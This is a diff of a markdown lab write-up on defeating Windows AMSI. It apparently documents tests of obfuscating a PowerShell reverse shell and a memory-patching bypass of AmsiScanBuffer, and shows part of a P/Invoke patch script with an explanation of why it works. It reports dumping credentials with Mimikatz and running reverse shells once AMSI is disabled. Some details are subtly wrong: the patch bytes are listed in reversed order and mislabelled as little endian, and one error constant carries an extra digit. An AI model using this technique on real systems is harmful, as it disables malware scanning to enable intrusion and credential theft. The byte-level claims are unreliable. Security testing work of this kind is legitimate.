@@ -1,4 +1,4 @@
-### Test 1 : Obfuscation of commands
+## Test 1 : Obfuscation of commands
 
 First, it was verified that the following powershell reverse shell command would be detected by AMSI.
 
@@ -36,15 +36,43 @@ However, this method would not be very helpful if the attacker had to run multip
 
 The better option would be disabling AMSI entirely.
 
---- 
 
-### Test 2 : Disabling AMSI - Memory Patching Method
 
-The following method completely disables AMSI by using a memory patch. Further research needs to be done on how exactly it works, but we were nonetheless able to test that it is an effective method.
+## Test 2 : Disabling AMSI - Memory Patching Method
+
+The following method completely disables AMSI by using a memory patch. We were able to test that it is an effective method.
 
 Note : This bypass disables AMSI only for the terminal it was executed on.
 
-Source Code from https://aidenpearce369.github.io/offsec/AMSI-Memory-Bypass/ : 
+### Why this particular method works 
+
+
+To understand why the technique works, we must first understand AMSI. AMSI protects PowerShell from malicious strings/scripts by loading a DLL (**amsi.dll**) into powershell's memory space each time a powershell process is started.
+
+Whenever any command is entered, AMSI submits the content to Windows Defender (or other AV engines). If the AV engine finds that the content may be malicious, AMSI instructs powershell to not run the code.
+
+The main function within **amsi.dll** responsible for checking powershell strings for malicious content is **AmsiScanBuffer()**. 
+
+Judging by the result of the content scan, **AmsiScanBuffer** returns the following result values : 
+```
+AMSI_RESULT_CLEAN = 0, # no detection found
+AMSI_RESULT_NOT_DETECTED = 1, # no detection found, but might change in the future
+AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384, # Admin policy blocked this content
+AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479, # Admin policy blocked this content
+AMSI_RESULT_DETECTED = 32768 # Detection found. Content is considered malware
+```
+basically : 0 means no malware, 32768 means malware.
+
+
+In addition, when we disassemble **AmsiScanBuffer**, we can see the following near the end of the function.
+
+![Alt text](misc/disassembler.png)
+
+First, it performs a series of validations. If the results of the validation are not as expected, it land in the block on the right, which has the instructions  ```mov eax 0x800700057``` . **0x80070057** actually correlates to the error code **E_INVALIDARG**. Otherwise, if it passes the validations, it goes through the actual scanning for malicious content, as depicted by the block on the left.
+
+The function then ends, and the powershell command a user typed is then executed depending on whether it passed the scanning **or if an invalid argument error occured**.
+
+Therefore, if we can force **AmsiScanBuffer()** to jump to the block on the right early on, we can easily bypass AMSI. This is exactly what the script below seeks to do. 
 
 ```powershell
 $pinvoke_obj = @"
@@ -74,6 +102,29 @@ $out = 0
 [WinApi]::VirtualProtect($funcAddr, [uint32]$patch.Length, $out, [ref] $null)
 ```
 
+It first retrieves the value of the address space allocated to **amsi.dll** and then extracts the address of **AmsiScanBuffer()**. The script then makes the address space writable, and patches the space with the following bytes :
+```
+(0xc3,0x80,0x07,0x00,0x57,0xb8)
+```
+These bytes correspond to the instruction (in little endian)
+```
+mov eax, 0x80070057
+ret
+```
+The **ret** instruction is needed to exit the function. If it worked correctly, we should be able to run any powershell command without any issues.
+
+Not only that, since we established earlier on that **AmsiScanBuffer** returning 0 means that no detection was found, we can also adjust the script such that the function prematurely returns 0, using an instruction like :
+```
+sub eax,eax 
+ret
+```
+The bypass will also work as usual with this change.
+
+
+
+
+### Validating that the method works
+
 However, as the original source code has been out for some time (2022), Windows Defender has already blocked it from running.
 
 ![Alt text](misc/detected.png)
@@ -95,4 +146,18 @@ However, after the memory patch, we able to use Mimikatz with no error and dump 
 We were also able to freely run other powershell commands (such as reverse shells) without the need of obfuscating them.
 
 
-Other references : https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux
+References : 
+
+https://aidenpearce369.github.io/offsec/AMSI-Memory-Bypass/ 
+
+https://www.cyberark.com/resources/threat-research-blog/amsi-bypass-redux
+
+https://rastamouse.me/memory-patching-amsi-bypass/
+
+https://fluidattacks.com/blog/amsi-bypass/
+
+
+--- 
+
+### Test 3 : Disabling AMSI - AMSI Killer
+
